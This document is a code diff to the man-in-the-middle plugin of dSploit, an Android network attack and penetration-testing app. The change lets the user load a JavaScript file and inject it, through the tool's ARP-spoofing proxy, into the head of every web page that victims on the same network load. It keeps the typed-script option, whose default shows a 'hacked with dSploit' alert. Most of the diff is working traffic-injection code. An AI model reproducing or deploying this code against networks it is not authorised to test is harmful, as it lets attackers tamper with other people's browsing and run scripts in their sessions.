@@ -18,6 +18,8 @@
  */
 package it.evilsocket.dsploit.plugins.mitm;
 
+import java.io.BufferedReader;
+import java.io.FileReader;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.regex.Matcher;
@@ -66,12 +68,14 @@ public class MITM extends Plugin
 {
 	private static final String  TAG 		     = "MITM";
 	private static final int     SELECT_PICTURE  = 1010;
+	private static final int     SELECT_SCRIPT   = 1011;
 	private static final Pattern YOUTUBE_PATTERN = Pattern.compile( "youtube\\.com/.*\\?v=([a-z0-9_-]+)", Pattern.CASE_INSENSITIVE );
 	
 	private ListView      	  mActionListView  = null;
 	private ActionAdapter 	  mActionAdapter   = null;
 	private ArrayList<Action> mActions  	   = new ArrayList<Action>();	
 	private Intent			  mImagePicker	   = null;
+	private Intent			  mScriptPicker    = null;
 	private ProgressBar       mCurrentActivity = null;
 	private SpoofSession	  mSpoofSession	   = null;
 	
@@ -241,6 +245,63 @@ public class MITM extends Plugin
 	    	{
 	    		System.errorLogging( TAG, e );
 	    	}
+	    }
+	    else if( request == SELECT_SCRIPT && result == RESULT_OK )
+	    {
+	    	String fileName = null;
+    		
+    		if( intent != null && intent.getData() != null )
+    			fileName = intent.getData().getPath();
+
+	    	if( fileName == null )
+	    	{
+	    		new ErrorDialog( "Error", "Could not determine file path, please use a different file manager.", MITM.this ).show();
+	    	}
+	    	else
+	    	{
+	    		try
+	    		{
+	    			
+	    			StringBuffer   buffer = new StringBuffer();
+	    			BufferedReader reader = new BufferedReader( new FileReader( fileName ) );
+	    			char[] 		   buf 	  = new char[1024];
+	    			int 		   read   = 0;
+	    			String		   js     = "";
+	    			
+			        while( ( read = reader.read(buf) ) != -1 )
+			        {
+			            buffer.append( String.valueOf( buf, 0, read ) );
+			        }
+			        reader.close();
+	    			
+			        js = buffer.toString().trim();
+			        
+			        if( js.startsWith("<script") == false && js.startsWith("<SCRIPT") == false )
+			        	js = "<script type=\"text/javascript\">\n" + js + "\n</script>\n";
+			        
+			        mCurrentActivity.setVisibility( View.VISIBLE );
+					
+					Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+						
+					final String code = js;
+					mSpoofSession = new SpoofSession( );
+					mSpoofSession.start( new OnSessionReadyListener() {									
+						@Override
+						public void onSessionReady() {
+							System.getProxy().setFilter( new Proxy.ProxyFilter() {					
+								@Override
+								public String onDataReceived( String headers, String data ) {												
+									return data.replaceAll( "(?i)</head>", code + "</head>" );
+								}
+							});												
+						}
+					});
+	    		}
+	    		catch( Exception e )
+	    		{
+	    			new ErrorDialog( "Error", "Unexpected error while reading the file : " + e.getMessage(), MITM.this ).show();
+	    		}
+	    	}		    	
 	    }
 	    else if( request == SettingsActivity.SETTINGS_DONE )
 		{
@@ -668,47 +729,64 @@ public class MITM extends Plugin
 				{
 					setStoppedState();
 					
-					new InputDialog
-					( 
-						"Javascript", 
-						"Enter the js code to inject :", 
-						"<script type=\"text/javascript\">\n" +
-						"  alert('This site has been hacked with dSploit!');\n" +
-						"</script>", 
-						true,
-						false,
-						MITM.this, 
-						new InputDialogListener(){
+					new ChoiceDialog( MITM.this, "Choose a method:", new String[]{ "Local files", "Custom Code" }, new ChoiceDialogListener(){
 						@Override
-						public void onInputEntered( String input ) 
-						{
-							final String js = input.trim();
-							if( js.isEmpty() == false || js.startsWith("<script") == false )
+						public void onChoice( int choice ) {
+							if( choice == 0 )
 							{
-								activity.setVisibility( View.VISIBLE );
-								
-								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
-									
-								mSpoofSession = new SpoofSession( );
-								mSpoofSession.start( new OnSessionReadyListener() {									
-									@Override
-									public void onSessionReady() {
-										System.getProxy().setFilter( new Proxy.ProxyFilter() {					
-											@Override
-											public String onDataReceived( String headers, String data ) {												
-												return data.replaceAll( "(?i)</head>", js + "</head>" );
-											}
-										});												
-									}
-								});
+								mCurrentActivity = activity;
+								startActivityForResult( mScriptPicker, SELECT_SCRIPT );
 							}
 							else
-								new ErrorDialog( "Error", "Invalid javascript code, remember to use <script></script> enclosing tags.", MITM.this ).show();
-						}} 
-					).show();	
+							{
+								new InputDialog
+								( 
+									"Javascript", 
+									"Enter the js code to inject :", 
+									"<script type=\"text/javascript\">\n" +
+									"  alert('This site has been hacked with dSploit!');\n" +
+									"</script>", 
+									true,
+									false,
+									MITM.this, 
+									new InputDialogListener(){
+									@Override
+									public void onInputEntered( String input ) 
+									{
+										final String js = input.trim();
+										if( js.isEmpty() == false || js.startsWith("<script") == false )
+										{
+											activity.setVisibility( View.VISIBLE );
+											
+											Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
+												
+											mSpoofSession = new SpoofSession( );
+											mSpoofSession.start( new OnSessionReadyListener() {									
+												@Override
+												public void onSessionReady() {
+													System.getProxy().setFilter( new Proxy.ProxyFilter() {					
+														@Override
+														public String onDataReceived( String headers, String data ) {												
+															return data.replaceAll( "(?i)</head>", js + "</head>" );
+														}
+													});												
+												}
+											});
+										}
+										else
+											new ErrorDialog( "Error", "Invalid javascript code, remember to use <script></script> enclosing tags.", MITM.this ).show();
+									}} 
+								).show();	
+							}
+						}
+						
+					}).show();
 				}
 				else
+				{
+					mCurrentActivity = null;
 					setStoppedState();
+				}
 			}
 		}));
     
@@ -777,9 +855,15 @@ public class MITM extends Plugin
         
         mActionListView.setAdapter( mActionAdapter );     
         
-		mImagePicker = new Intent( Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI );
+		mImagePicker = new Intent( Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI );		
 		mImagePicker.setType("image/*");
 		mImagePicker.putExtra( Intent.EXTRA_LOCAL_ONLY, true );
+		
+		mScriptPicker = new Intent();
+		mScriptPicker.addCategory( Intent.CATEGORY_OPENABLE );
+        mScriptPicker.setType( "text/*" );
+        mScriptPicker.setAction( Intent.ACTION_GET_CONTENT );
+        mScriptPicker.putExtra( Intent.EXTRA_LOCAL_ONLY, true );
 	}
 	
 	@Override
